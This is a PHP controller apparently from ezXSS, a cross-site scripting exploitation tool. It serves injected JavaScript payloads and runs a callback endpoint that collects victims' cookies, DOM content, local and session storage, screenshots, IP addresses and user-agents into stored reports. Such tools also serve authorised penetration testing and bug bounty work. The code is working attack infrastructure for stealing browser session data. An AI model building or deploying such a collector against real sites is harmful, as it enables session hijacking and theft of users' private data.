<?php

class Payloads extends Controller
{

    /**
     * Catch all default payload
     *
     * @return string
     */
    public function index()
    {
        $this->view->renderPayload('index');
        $this->view->setContentType('application/x-javascript');

        $this->view->renderData('noCollect', '');
        $this->view->renderData('pages', '');
        $this->view->renderData('screenshot', '');
        $this->view->renderData('customjs', '//test');
        $this->view->renderData('payload', e("//{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}"));

        return $this->view->getContent();
    }

    /**
     * Custom payloads
     *
     * @return string
     */
    public function custom($name)
    {
        try {
            $this->view->renderPayload($name);
            $this->view->setContentType('application/x-javascript');
            return $this->view->getContent();
        } catch (Exception $e) {
            return $this->index();
        }
    }

    /**
     * Callback function
     *
     * @return string
     */
    public function callback()
    {
        // Set the content type to plain text
        $this->view->setContentType('text/plain');

        // Decode the JSON data
        $data = json_decode(file_get_contents('php://input'), false);

        // Set a default value for the screenshot
        $data->screenshot = $data->screenshot ?? '';

        // Get the user's IP address
        $userIP = $data->ip ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];

        // Remove the protocol from the origin URL
        $data->origin = str_replace(['https://', 'http://'], '', $data->origin);

        // Truncate very long strings
        $data->uri = substr($data->uri, 0, 1000);
        $data->referer = substr($data->referer, 0, 1000);
        $data->origin = substr($data->origin, 0, 500);
        $data->payload = substr($data->payload, 0, 500);
        $data->{'user-agent'} = substr($data->{'user-agent'}, 0, 500);

        // TODO: Check black/whitelist

        // Check if the report should be saved or alerted
        $doubleReport = false;
        if ($this->model('Setting')->get('filter-save') == 0 || $this->model('Setting')->get('filter-alert') == 0) {
            if ($this->model('Report')->searchForDublicates($data->cookies, $data->dom, $data->origin, $data->referer, $data->uri, $data->{'user-agent'}, $userIP)) {
                if ($this->model('Setting')->get('filter-save') == 0 && $this->model('Setting')->get('filter-alert') == 0) {
                    return 'github.com/ssl/ezXSS';
                } else {
                    $doubleReport = true;
                }
            }
        }

        // Check if the DOM should be truncated
        if ($this->model('Setting')->get('dompart') > 0 && strlen($data->dom) > $this->model('Setting')->get('dompart')) {
            $domExtra = '&#13;&#10;&#13;&#10;View full dom on the report page or change this setting on /settings';
        } else {
            $domExtra = '';
        }

        if (($doubleReport && ($this->model('Setting')->get('filter-save') == 1 || $this->model('Setting')->get('filter-alert') == 1)) || (!$doubleReport)) {
    
            // Create a image from the screenshot data
            if (!empty($data->screenshot)) {
                $screenshot = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data->screenshot));
                $screenshotName = time() . md5(
                        $data->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
                    ) . bin2hex(openssl_random_pseudo_bytes(5));
                $saveImage = fopen(__DIR__ . "/../../assets/img/report-{$screenshotName}.png", 'w');
                fwrite($saveImage, $screenshot);
                fclose($saveImage);
            }

            // Save the report
            $shareId = sha1(bin2hex(openssl_random_pseudo_bytes(32)) . time());
            $report = $this->model('Report')->add($shareId, $data->cookies, $data->dom, $data->origin, 
                                                  $data->referer, $data->uri, $data->{'user-agent'}, $userIP, ($screenshotName ?? ''), 
                                                  json_encode($data->localstorage), json_encode($data->sessionstorage), $data->payload);
            
            // Send out alerts
            if (($doubleReport && $this->model('Setting')->get('filter-alert') == 1) || (!$doubleReport)) {
                $this->alert();
            }
        }

        return 'github.com/ssl/ezXSS';
    }

    private function alert() {
        // TODO: alerting
    }
}
